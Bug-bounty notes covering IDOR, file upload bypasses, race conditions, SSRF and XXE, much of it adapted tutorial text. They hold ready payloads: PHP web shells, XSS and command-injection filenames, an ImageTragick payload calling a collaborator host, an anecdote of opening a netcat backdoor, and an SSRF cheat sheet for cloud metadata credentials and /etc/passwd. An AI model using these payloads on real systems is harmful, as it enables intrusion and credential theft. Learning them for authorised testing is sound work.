<summary>IDOR</summary>

<dl>
<dd>

What are insecure direct object references (IDOR)?  
Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly. The term IDOR was popularized by its appearance in the OWASP 2007 Top Ten. However, it is just one example of many access control implementation mistakes that can lead to access controls being circumvented. IDOR vulnerabilities are most commonly associated with horizontal privilege escalation, but they can also arise in relation to vertical privilege escalation.

<details>
<summary>IDOR examples</summary>

<dl>
<dd>

There are many examples of access control vulnerabilities where user-controlled parameter values are used to access resources or functions directly.

<details>
<summary>IDOR vulnerability with direct reference to database objects</summary>

<dl>
<dd>

Consider a website that uses the following URL to access the customer account page, by retrieving information from the back-end database:

https://insecure-website.com/customer_account?customer_number=132355  
Here, the customer number is used directly as a record index in queries that are performed on the back-end database. If no other controls are in place, an attacker can simply modify the customer\_number value, bypassing access controls to view the records of other customers. This is an example of an IDOR vulnerability leading to horizontal privilege escalation.

An attacker might be able to perform horizontal and vertical privilege escalation by altering the user to one with additional privileges while bypassing access controls. Other possibilities include exploiting password leakage or modifying parameters once the attacker has landed in the user's accounts page, for example.

</dd>
</dl>

</details>

<details>
<summary>IDOR vulnerability with direct reference to static files</summary>

<dl>
<dd>

IDOR vulnerabilities often arise when sensitive resources are located in static files on the server-side filesystem. For example, a website might save chat message transcripts to disk using an incrementing filename, and allow users to retrieve these by visiting a URL like the following:

https://insecure-website.com/static/12144.txt  
In this situation, an attacker can simply modify the filename to retrieve a transcript created by another user and potentially obtain user credentials and other sensitive data.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Burp Search regex</summary>

<dl>
<dd>

1. (?i)\b\w\*id\b(?!\w)\s\*=\s\*("[^"]\*"|'[^']\*'|[^&\s}]\*)

2. "(?i)(\\?|\\&)(((([a-z0-9-*])+(-|*)+))|(-|\_))?(id|uuid|user|account|number|order|no|doc|key|email|group|profile|edit|report|username)((=)|(\\/[0-9]+\\/?))"

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>File Upload Vulnerabilities</summary>

<dl>
<dd>

<details>
<summary>Tip</summary>

<dl>
<dd>

The `Content-Type` response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping.

</dd>
</dl>

</details>

<details>
<summary>Filename Tip</summary>

<dl>
<dd>

Set filename to:-

> ../../../tmp/lol.png for path traversals  
> sleep(10)-- -.jpg for SQLi.  
> <svg onload=alert(document.comain)>.jpg/png for xss  
> ; sleep 10; for command injections

Found an interesting

#XSS

where I inject the payload within the image file name and got the alert!.   
  
Payload: "12345-abc-1-23456<scr<script>ipt>alert(document.cookie)<%2Fscr<script>ipt>.img"   
  
12345-abc-1-23456.img ==> Image name.

Filenames can contain HTML tags on Unix-based systems.

In most cases, you should manually edit the filename when the file is uploaded (e.g., using Burp Suite).

report<img src onerror=alert(1)>.csv

If you want to upload a PHP web shell but the application performs sanitization on the file extension, try equivalents such as .phtml, .php5, .php7 and so on

Cheers!

</dd>
</dl>

</details>

<details>
<summary>Exploiting unrestricted file uploads to deploy a web shell</summary>

<dl>
<dd>

From a security perspective, the worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server.

### **Web shell**

`A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.`

If you're able to successfully upload a web shell, you effectively have full control over the server. This means you can read and write arbitrary files, exfiltrate sensitive data, even use the server to pivot attacks against both internal infrastructure and other servers outside the network. For example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:

```
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Once uploaded, sending a request for this malicious file will return the target file's contents in the response.

A more versatile web shell may look something like this:

```
<?php echo system($_GET['command']); ?>
```

This script enables you to pass an arbitrary system command via a query parameter as follows:

```
GET /example/exploit.php?command=id HTTP/1.1
```

</dd>
</dl>

</details>

<details>
<summary>Exploiting flawed validation of file uploads</summary>

<dl>
<dd>

<details>
<summary>Flawed file type validation</summary>

<dl>
<dd>

When submitting HTML forms, the browser typically sends the provided data in a `POST` request with the content type `application/x-www-form-url-encoded`. This is fine for sending simple text like your name or address. However, it isn't suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type `multipart/form-data` is preferred.

Consider a form containing fields for uploading an image, providing a description of it, and entering your username. Submitting such a form might result in a request that looks something like this:

```
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--
```

As you can see, the message body is split into separate parts for each of the form's inputs. Each part contains a `Content-Disposition` header, which provides some basic information about the input field it relates to. These individual parts may also contain their own `Content-Type` header, which tells the server the MIME type of the data that was submitted using this input.

One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed using tools like Burp Repeater.

<details>
<summary>Summery :</summary>

<dl>
<dd>

change `Content-Type`  of the uploaded webshell file to supported content-type of web-app . E.g, `image/jpeg`.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Preventing file execution in user-accessible directories</summary>

<dl>
<dd>

While it's clearly better to prevent dangerous file types being uploaded in the first place, the second line of defense is to stop the server from executing any scripts that do slip through the net.

As a precaution, servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead:

```
GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com


HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 39

<?php echo system($_GET['command']); ?>
```

This behavior is potentially interesting in its own right, as it may provide a way to leak source code, but it nullifies any attempt to create a web shell.

This kind of configuration often differs between directories. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.

Tip  
Web servers often use the `filename` field in `multipart/form-data` requests to determine the name and location where the file should be saved.

You should also note that even though you may send all of your requests to the same domain name, this often points to a reverse proxy server of some kind, such as a load balancer. Your requests will often be handled by additional servers behind the scenes, which may also be configured differently.

here we can try **Web shell upload via path traversal.**

</dd>
</dl>

</details>

<details>
<summary>Insufficient blacklisting of dangerous file types</summary>

<dl>
<dd>

One of the more obvious ways of preventing users from uploading malicious scripts is to blacklist potentially dangerous file extensions like `.php`. The practice of blacklisting is inherently flawed as it's difficult to explicitly block every possible file extension that could be used to execute code. Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as `.php5`, `.shtml`, and so on.

<details>
<summary>### **Overriding the server configuration</summary>

<dl>
<dd>

As we discussed in the previous section, servers typically won't execute files unless they have been configured to do so. For example, before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their `/etc/apache2/apache2.conf` file:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present.

Similarly, developers can make directory-specific configuration on IIS servers using a `web.config` file. This might include directives such as the following, which in this case allows JSON files to be served to users:

```
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

Web servers use these kinds of configuration files when present, but you're not normally allowed to access them using HTTP requests. However, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type.

**LAB**

PRACTITIONER**Web shell upload via extension blacklist bypass**

</dd>
</dl>

</details>

<details>
<summary>### **Obfuscating file extensions</summary>

<dl>
<dd>

Even the most exhaustive blacklists can potentially be bypassed using classic obfuscation techniques. Let's say the validation code is case sensitive and fails to recognize that `exploit.pHp` is in fact a `.php` file. If the code that subsequently maps the file extension to a MIME type is **not** case sensitive, this discrepancy allows you to sneak malicious PHP files past validation that may eventually be executed by the server.

You can also achieve similar results using the following techniques:

- Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: `exploit.php.jpg`

- Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`

- Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`

- Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`

- Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.

Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip `.php` from the following filename:

```
exploit.p.phphp
```

This is just a small selection of the many ways it's possible to obfuscate file extensions

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Flawed validation of the file's contents</summary>

<dl>
<dd>

Instead of implicitly trusting the `Content-Type` specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.

In the case of an image upload function, the server might try to verify certain intrinsic properties of an image, such as its dimensions. If you try uploading a PHP script, for example, it won't have any dimensions at all. Therefore, the server can deduce that it can't possibly be an image, and reject the upload accordingly.

Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`.

This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.

**Remote code execution via polyglot web shell upload**

</dd>
</dl>

</details>

<details>
<summary>Exploiting file upload race conditions</summary>

<dl>
<dd>

Modern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.

That said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous race conditions that enable an attacker to completely bypass even the most robust validation.

For example, some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it.

These vulnerabilities are often extremely subtle, making them difficult to detect during blackbox testing unless you can find a way to leak the relevant source code.

**LAB :** **Web shell upload via race condition**

<details>
<summary>### **Race conditions in URL-based file uploads</summary>

<dl>
<dd>

Similar race conditions can occur in functions that allow you to upload a file by providing a URL. In this case, the server has to fetch the file over the internet and create a local copy before it can perform any validation.

As the file is loaded using HTTP, developers are unable to use their framework's built-in mechanisms for securely validating files. Instead, they may manually create their own processes for temporarily storing and validating the file, which may not be quite as secure.

For example, if the file is loaded into a temporary directory with a randomized name, in theory, it should be impossible for an attacker to exploit any race conditions. If they don't know the name of the directory, they will be unable to request the file in order to trigger its execution. On the other hand, if the randomized directory name is generated using pseudo-random functions like PHP's `uniqid()`, it can potentially be brute-forced.

To make attacks like this easier, you can try to extend the amount of time taken to process the file, thereby lengthening the window for brute-forcing the directory name. One way of doing this is by uploading a larger file. If it is processed in chunks, you can potentially take advantage of this by creating a malicious file with the payload at the start, followed by a large number of arbitrary padding bytes.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Exploiting file upload vulnerabilities without remote code execution</summary>

<dl>
<dd>

In the examples we've looked at so far, we've been able to upload server-side scripts for remote code execution. This is the most serious consequence of an insecure file upload function, but these vulnerabilities can still be exploited in other ways.

<details>
<summary>Uploading malicious client-side scripts</summary>

<dl>
<dd>

Although you might not be able to execute scripts on the server, you may still be able to upload scripts for client-side attacks. For example, if you can upload HTML files or SVG images, you can potentially use `<script>` tags to create stored XSS payloads.

If the uploaded file then appears on a page that is visited by other users, their browser will execute the script when it tries to render the page. Note that due to same-origin policy restrictions, these kinds of attacks will only work if the uploaded file is served from the same origin to which you upload it.

</dd>
</dl>

</details>

<details>
<summary>Exploiting vulnerabilities in the parsing of uploaded files</summary>

<dl>
<dd>

If the uploaded file seems to be both stored and served securely, the last resort is to try exploiting vulnerabilities specific to the parsing or processing of different file formats. For example, you know that the server parses XML-based files, such as Microsoft Office `.doc` or `.xls` files, this may be a potential vector for XXE injection attacks.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Uploading files using PUT</summary>

<dl>
<dd>

It's worth noting that some web servers may be configured to support `PUT` requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface.

```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

<details>
<summary>Tip</summary>

<dl>
<dd>

You can try sending `OPTIONS` requests to different endpoints to test for any that advertise support for the `PUT` method.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>File upload hacks</summary>

<dl>
<dd>

<details>
<summary>Here’s a top 10 list of things that you can achieve by uploading</summary>

<dl>
<dd>

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE

2. **SVG**: Stored XSS / SSRF / XXE

3. **GIF**: Stored XSS / SSRF

4. **CSV**: CSV injection

5. **XML**: XXE

6. **AVI**: LFI / SSRF

7. **HTML / JS** : HTML injection / XSS / Open redirect

8. **PNG / JPEG**: Pixel flood attack (DoS)

9. **ZIP**: RCE via LFI / DoS

10. **PDF / PPTX**: SSRF / BLIND XXE

</dd>
</dl>

</details>

<details>
<summary>File extension list useful when to find vulnerabilities in file upload functionalities</summary>

<dl>
<dd>

ASP:

- .aspx

- .config

- .ashx

- .asmx

- .aspq

- .axd

- .cshtm

- .cshtml

- .rem

- .soap

- .vbhtm

- .vbhtml

- .asa

- .asp

- .cer

- .shtml

PHP:

- .php

- .php5

- .php3

- .php2

- .shtml

- .html

- .php.png(double extension attack)

<details>
<summary>Tip</summary>

<dl>
<dd>

ASP / PHP file with a webshell – RCE

HTML file with Javascript code – XSS

EICAR file – test possibility of hosting malware

Don’t forget to always try the NULL byte injection trick as well, e.g:

file.jpg%00shell.php

shell.php%00file.jpg

shell.php%00.jpg

files names testing

- `../../../tmp/lol.png` —> for path traversal

- `sleep(10)-- -.jpg` —> for SQL injection

- `<svg onload=alert(document.domain)>.jpg/png` —> for XSS

- `; sleep 10;` —> for command injections

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>https://twitter.com/0x0SojalSec/status/1566093568909144064?s=20&t=WgwzZjVAY7IkkAxRYAOAEA</summary>



</details>

<details>
<summary>Turning LFI to RCE in PHP using ZIP wrapper</summary>

<dl>
<dd>

1. Create a .php file (rce.php)

2. Compress it to a .zip file (file.zip)

3. Upload your .zip file on the vulnerable web application

4. Trigger your RCE via accessing:`https://site.com/index.php?page=zip://path/file.zip%23rce.php`

**Note**: `%23` is # symbol which serves as a delimiter between the archive filename and the filename inside the archive that we want to unzip.

</dd>
</dl>

</details>

<details>
<summary>Image upload hacks</summary>

<dl>
<dd>

If you find a file upload function for an image, try introducing an image with XSS in the filename like so:  
  
<img src=x onerror=alert('XSS')>.png  
"><img src=x onerror=alert('XSS')>.png  
"><svg onmouseover=alert(1)>.svg  
<<script>alert('xss')<!--a-->a.png

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Blind RCE</summary>

<dl>
<dd>

When you find a file upload center inside any site  
You will definitely look for RCE because it is considered the most important and dangerous security vulnerability that gives you access to a server and a backdoor.  
  
Well, I decided to upload my own picture on one of the private sites  
So I got the end point of his photos, which are uploaded to the same site without the use of third-party

http://test.com/pic/im4x.jpg

Therefore, I decided to send the request to the Burp  
But I found the content of the image does not appear in the burp  
which only appears in image format  
  
{"content-type":"image/jpeg","file\_ext":"jpeg"}  
  
Where I changed it to to  
  
{"content-type":"application/x-httpd-php","file\_ext":"php"}  
  
I found that the image was uploaded in .php format correctly  
So I created a RCE.jpg file with the content:-  
  
<?php system($\_GET['im4x']);?>  
  
im4x: It is the variable that we change in order to give the server commands  
I also uploaded the RCE.jpg file  
I intercepted the request and changed it to PHP  
  
The site was not showing me what I was printing in the im4x variable l

**ike <whoami, ls , pwd , ..**

etc >  
  
So I used a command that forces the site to visit another site (you can use Burp Collaborator)

http://test.com/pic/RCE.php?im4x=Ping…+<Burp Collaborator>  
  
I got a response, the link was visited, so I made sure the site accepts injections  
I opened my back door easily with NC

</dd>
</dl>

</details>

<details>
<summary>XXE</summary>

<dl>
<dd>

Some methods to check XXE vuln

1- Convert the content type from "application/json"/"application/x-www-form-urlencoded" to "applcation/xml".

2- If svg allowed in picture upload , you can inject xml in svgs.

</dd>
</dl>

</details>

<details>
<summary>Impact by extension</summary>

<dl>
<dd>

asp, aspx, php : webshell, rce  
svg: stored xss, ssrf, xxe  
gif: stored xss, ssrf  
csv: csv injection  
xml: xxe  
avi: lfi,ssrf  
html, js: html injection, xss, open redirect  
png: pixel flood attack, dos  
zip: rce via lfi, dos  
pdf: ssrf, blind xxe

<details>
<summary>ImageTragick payload</summary>

<dl>
<dd>

Have a file upload that only accepts images?

Try this imagetragick payload:

%!PS  
userdict /setpagedevice undef  
save  
legal  
{ null restore } stopped { pop } if  
{ legal } stopped { pop } if  
restore  
mark /OutputFile (%pipe%nslookup YOURCOLLABURL) currentdevice putdeviceprops

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>PDF injection to local file read</summary>

<dl>
<dd>

Got injection in a PDF, try reading local files with  
<div><object data=\"c:\\inetpub\\wwwroot\\web.config\">

</dd>
</dl>

</details>

<details>
<summary>https://www.cobalt.io/blog/file-upload-vulnerabilities</summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>Race Conditions</summary>

<dl>
<dd>

<details>
<summary>Race condition Tip</summary>

<dl>
<dd>

https://twitter.com/imranHudaA/status/1407954842350284805?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

</dd>
</dl>

</details>

know how to use :

- burp turbo-intruder

- https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group#sending-requests-in-parallel

- https://portswigger.net/research/smashing-the-state-machine

</dd>
</dl>

</details>

<details>
<summary>SSRF</summary>

<dl>
<dd>

<details>
<summary>Burp Search regex</summary>

<dl>
<dd>

Quick and dirty way to find parameters vulnerable to LFI & Path Traversal & SSRF & Open Redirect:  
Burp Search > Regex  
\?.\*=(\/\/?\w+|\w+\/|\w+(%3A|:)(\/|%2F)|%2F|[\.\w]+\.\w{2,4}[^\w])

</dd>
</dl>

</details>

<details>
<summary>Detection</summary>

<dl>
<dd>

Check out parameters such as /file=, /path=, /src= to see if the application can send request only to whitelisted applications

Check out if there is PDF or any other file export tool in place which may be vulnerable to SSRF

</dd>
</dl>

</details>

<details>
<summary>SSRF with blacklist-based input filters</summary>

<dl>
<dd>

Some applications block input containing hostnames like `127.0.0.1` and `localhost`, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using the following techniques:

- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.

- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.

- Obfuscate blocked strings using URL encoding or case variation.

- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.

- Little known or talked about fact: EC2 instances on AWS are preconfigured with an /etc/hosts record to point the hostname “instance-data” to the metadata service. Would look like: http://instance-data/latest/meta-data/. Likely missed in SSRF blacklists.

</dd>
</dl>

</details>

<details>
<summary>SSRF with whitelist-based input filters</summary>

<dl>
<dd>

Some applications only allow inputs that match, a whitelist of permitted values. The filter may look for a match at the beginning of the input, or contained within in it. You may be able to bypass this filter by exploiting inconsistencies in URL parsing.

The URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method:

- You can embed credentials in a URL before the hostname, using the `@` character. For example:`https://expected-host:fakepassword@evil-host`

- You can use the `#` character to indicate a URL fragment. For example:`https://evil-host#expected-host`

- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:`https://expected-host.evil-host`

- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.

- You can use combinations of these techniques together.

</dd>
</dl>

</details>

<details>
<summary>Bypassing SSRF filters via open redirection</summary>



</details>

<details>
<summary>Finding hidden attack surface for SSRF vulnerabilities</summary>

<dl>
<dd>

Many server-side request forgery vulnerabilities are easy to find, because the application's normal traffic involves request parameters containing full URLs. Other examples of SSRF are harder to locate.

<details>
<summary>Partial URLs in requests</summary>

<dl>
<dd>

Sometimes, an application places only a hostname or part of a URL path into request parameters. The value submitted is then incorporated server-side into a full URL that is requested. If the value is readily recognized as a hostname or URL path, the potential attack surface might be obvious. However, exploitability as full SSRF might be limited because you do not control the entire URL that gets requested.

</dd>
</dl>

</details>

<details>
<summary>URLs within data formats</summary>

<dl>
<dd>

Some applications transmit data in formats with a specification that allows the inclusion of URLs that might get requested by the data parser for the format. An obvious example of this is the XML data format, which has been widely used in web applications to transmit structured data from the client to the server. When an application accepts data in XML format and parses it, it might be vulnerable to XXE injection. It might also be vulnerable to SSRF via XXE. We'll cover this in more detail when we look at XXE injection vulnerabilities.

</dd>
</dl>

</details>

<details>
<summary>SSRF via the Referer header</summary>

<dl>
<dd>

Some applications use server-side analytics software to tracks visitors. This software often logs the Referer header in requests, so it can track incoming links. Often the analytics software visits any third-party URLs that appear in the Referer header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the Referer header is often a useful attack surface for SSRF vulnerabilities. See Blind SSRF vulnerabilities for examples of vulnerabilities involving the Referer header.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>External DNS interaction</summary>

<dl>
<dd>

Try RCE, enter url `whoami`.burpcollab.net and then see the all the requests, You will see http://www-data.burpcollab.net or any other username. Research a bit more before reporting and exploiting. This can be escalated to P1 also but you have to learn and try stuff

</dd>
</dl>

</details>

<details>
<summary>Tips</summary>

<dl>
<dd>

<details>
<summary>1</summary>

<dl>
<dd>

SSRF Tip

If you found something similar to this in your request body

{"endpoint":"/adduser","name:"test"}

add @burpcollab.com before /

{"endpoint":"@burpcollab.com/adduser"}

in the backend it will be "https://website@burpcollab.com/adduser"

</dd>
</dl>

</details>

<details>
<summary>2</summary>

<dl>
<dd>

Check for all protocols : **file:///**, **dict://**, **ftp://, ldap://** and **gopher:// etc.. and notice the response.**

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Exploitation tip</summary>

<dl>
<dd>

If you ever found ssrf & failed to access internally hosted web services then always search localhost & 127.0.0.1 in main.js or in app.js , you may end up in accessing internal web resources.

</dd>
</dl>

</details>

<details>
<summary>SSRF via headers</summary>

<dl>
<dd>

<details>
<summary>Theory</summary>

<dl>
<dd>

t’s possible to perform a header exploitation by spoofing header value(s) within a reverse proxy, if the setup is misconfigured. This can lead to *Improper Access, Server-Side Request Forgery, Denial of service, Stored Open Redirect, Stored Cross-Site Scripting etc*.

</dd>
</dl>

</details>

<details>
<summary>Headers</summary>

<dl>
<dd>

General

`X-Forwarded-For  
X-Forwarded-Host  
X-Forwarded-Proto`

Nginx

`X-Real-IP  
Forwarded`

Apache

`X-Forwarded-Server  
X-Real-IP  
Max-Forwards`

Envoy

`X-Envoy-external-adress  
X-Envoy-internal  
X-Envoy-Original-Dst-Host`

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>All about SSRF</summary>

<dl>
<dd>

https://twitter.com/rootxyash/status/1479432917499592704?s=20&t=mGFdrpw2UKHGVklpbLtVEQ

https://twitter.com/d1pakdas/status/1558186313198669824?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

</dd>
</dl>

</details>

<details>
<summary>Cheatsheet</summary>

<dl>
<dd>

**Basic localhost Payloads:**http://127.0.0.1:port  
http://localhost:port  
https://127.0.0.1:port  
https://localhost:port  
http://[::]:port  
http://0000::1:port  
http://[0:0:0:0:0:ffff:127.0.0.1]  
http://0/http://127.1http://127.0.1

---

**File path:**  
/etc/passwd  
file:///etc/passwd  
file://path/to/file  
file://\/\/etc/passwd

---

**With other protocols:**  
sftp://attacker.com:port/  
dict://attacker:port/  
tftp://attacker.com:port/  
ldap://localhost:port/  
gopher://127.0.0.1:port/

---

**From XSS:**  
\<img src="xxx" onerror="document.write('\<iframe src=file:///etc/passwd>\</iframe>')"/>\  
\<link rel=attachment href="file:///etc/passwd">\

---

**With iframe injection:**  
<?php $file = $\_GET['file']; header("location:file://$file");?>  
\<iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>\

---

**AWS:**http://instance-datahttp://169.254.169.254http://169.254.169.254/latest/user-datahttp://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]  
http://169.254.169.254/latest/meta-data/http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]  
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstancehttp://169.254.169.254/latest/meta-data/ami-idhttp://169.254.169.254/latest/meta-data/reservation-idhttp://169.254.169.254/latest/meta-data/hostnamehttp://169.254.169.254/latest/meta-data/public-keys/http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key[http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key](http://169.254.169.254/latest/meta-data/public-keys/%5BID%5D/openssh-key)http://169.254.169.254/latest/meta-data/iam/security-credentials/dummyhttp://169.254.169.254/latest/meta-data/iam/security-credentials/s3accesshttp://169.254.169.254/latest/dynamic/instance-identity/document

---

**Google Cloud:**http://169.254.169.254/computeMetadata/v1/http://metadata.google.internal/computeMetadata/v1/http://metadata/computeMetadata/v1/http://metadata.google.internal/computeMetadata/v1/instance/hostnamehttp://metadata.google.internal/computeMetadata/v1/instance/idhttp://metadata.google.internal/computeMetadata/v1/project/project-id

---

Azure:  
http://169.254.169.254/metadata/v1/maintenancehttp://169.254.169.254/metadata/instance?api-version=2017-04-02http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text

---

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>XXE</summary>

<dl>
<dd>

<details>
<summary>All about XML</summary>

<dl>
<dd>

## **What is XML?**

XML stands for "extensible markup language". XML is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. Earlier in the web's history, XML was in vogue as a data transport format (the "X" in "AJAX" stands for "XML"). But its popularity has now declined in favor of the JSON format.

## **What are XML entities?**

XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities `<` and `>` represent the characters `<` and `>`. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.

## **What is document type definition?**

The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional `DOCTYPE` element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.

## **What are XML custom entities?**

XML allows custom entities to be defined within the DTD. For example:

```
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
```

This definition means that any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value: "`my entity value`".

## **What are XML external entities?**

XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.

The declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded. For example:

```
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
```

The URL can use the `file://` protocol, and so external entities can be loaded from file. For example:

```
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

XML external entities provide the primary means by which XML external entity attacks arise.

</dd>
</dl>

</details>

<details>
<summary>Burp extentions</summary>

<dl>
<dd>

1. https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278

</dd>
</dl>

</details>

<details>
<summary>What are the types of XXE attacks?</summary>

<dl>
<dd>

There are various types of XXE attacks:

- Exploiting XXE to retrieve files, where an external entity is defined containing the contents of a file, and returned in the application's response.

- Exploiting XXE to perform SSRF attacks, where an external entity is defined based on a URL to a back-end system.

- Exploiting blind XXE exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the attacker controls.

- Exploiting blind XXE to retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive data.

</dd>
</dl>

</details>

<details>
<summary>How to find and test for XXE vulnerabilities</summary>

<dl>
<dd>

The vast majority of XXE vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner.

